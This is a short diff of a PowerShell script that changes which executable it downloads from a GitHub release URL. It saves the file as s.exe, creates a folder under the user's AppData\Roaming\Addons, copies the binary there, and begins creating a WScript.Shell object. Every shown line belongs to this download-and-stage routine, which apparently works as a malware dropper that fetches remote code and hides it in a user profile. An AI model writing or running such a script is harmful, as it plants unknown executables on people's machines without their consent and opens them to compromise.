@@ -1,4 +1,4 @@
-Invoke-WebRequest "https://github.com/DrunkenLyricist/nanny/releases/download/shit/hexagons.exe" -o s.exe
+Invoke-WebRequest "https://github.com/DrunkenLyricist/nanny/releases/download/shepard/main.exe" -o s.exe
 new-item C:\Users\$env:username\AppData\Roaming\Addons\ -itemtype directory
 Copy-Item s.exe C:\Users\$env:username\AppData\Roaming\Addons\
 $WshShell = New-Object -comObject WScript.Shell
